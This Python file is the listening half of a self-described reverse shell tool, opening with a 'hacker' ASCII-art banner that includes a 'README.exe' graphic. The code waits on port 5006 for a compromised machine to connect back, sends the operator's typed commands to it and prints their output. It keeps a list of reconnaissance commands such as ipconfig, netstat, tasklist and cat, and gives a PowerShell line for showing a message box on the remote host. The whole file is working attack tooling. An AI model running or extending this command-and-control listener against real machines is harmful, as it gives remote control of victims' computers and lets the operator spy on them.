import socket

cool_Hacker_opening = """
 ________  _______   ________  ________  _____ ______   _______       _______      ___    ___ _______
|\\   __  \\|\  ___ \\ |\\   __  \\|\\   ___ \\|\\   _ \\  _   \\|\\  ___ \\     |\\  ___ \\    |\\  \\  /  /|\\  ___ \\
\\ \\  \\|\\  \\ \\   __/|\\ \\  \\|\\  \\ \\  \\_|\\ \\ \\  \\\\\\__\\ \\  \\ \\   __/|    \\ \\   __/|   \\ \\  \\/  / | \\   __/|
 \\ \\   _  _\\ \\  \\_|/_\\ \\   __  \\ \\  \\ \\\\ \\ \\  \\\\|__| \\  \\ \\  \\_|/__   \\ \\  \\_|/__  \\ \\    / / \\ \\  \\_|/__
  \\ \\  \\\\  \\\\ \\  \\_|\\ \\ \\  \\ \\  \\ \\  \\_\\\\ \\ \\  \\    \\ \\  \\ \\  \\_|\\ \\ __\\ \\  \\_|\\ \\  /     \\/   \\ \\  \\_|\\ \\
   \\ \\__\\\\ _\\\\ \\_______\\ \\__\\ \\__\\ \\_______\\ \\__\\    \\ \\__\\ \\_______\\\\__\\ \\_______\\/  /\\   \\    \\ \\_______\\
    \\|__|\\|__|\\|_______|\\|__|\\|__|\\|_______|\\|__|     \\|__|\\|_______\\|__|\\|_______/__/ /\\ __\\    \\|_______|
                                                                                  |__|/ \\|__|

        #      #
      #     #      #
   # #   ##  ###   #   #
       #    #    ##   #  ##
  #  ##   ##   ###   #
    /\\# ###/\\  #  _/*\\  #
   /*@*\\__/**\\/\\/*&@*|   #
   \*% ________ *%$#!*\\
    | |        | \\**^%*|
    |\\| ~~~~~~~L___\\*!@/
     \\| ~~~~~~~~~~~ |/
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      | ~~~~~~~~~~~ |
      .-------------.
        README.exe

"""

print("\n\n\n\n\n\n\n\n"+cool_Hacker_opening)
print("\n\n\nThe reverse shell tool (severside)\n\n")
print("If you want to send a message to the person on the other end type:\nPowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"")
print("\n\nIf you type an incorrect command or the buffer overflows, type 'debuff' to retrieve the backed up response.\n")
#"0.0.0.0" is any ipv4 address the computer is listed as in any network
host = "0.0.0.0"
port = 5006
#buffer of 1024kb
buffer = 64000

s = socket.socket()
s.bind((host,port))
s.listen(1) #the number is how many connections it will take before refusing anymore

print(f"\nstarted listening on port {port}...\n\n")

client_socket, client_addr = s.accept()

print(f"CONNECTION made with {str(client_addr)}:")

#A list of commands that return information so that I can fix the problem of not being able to use commands that don't return information.
Data_ret_comm = ["dir", "ls", "ifconfig", "ipconfig", "cat", "echo", "find", "finger", "grep", "groups", "head", "history", "less", "man", "move", "ping", "ps", "pwd", "tail", "uname", "w", "netstat", "route", "net", "tasklist", "getmac","netsh", "help"]

#this is the command execution part
while True:
    #input and sending the command
    command = input(">>>")
    if command.lower() != "debuff":
        client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    #A command to retrieve any residual buffer overflow or none-listed info returning commands
    elif command.lower() == "debuff":
        response = client_socket.recv(buffer).decode()
        print(response)
    #retrieve response from commands that output text
    elif command.split()[0] in Data_ret_comm:
        response = client_socket.recv(buffer).decode()
        print(response)
client_socket.close()
s.close()
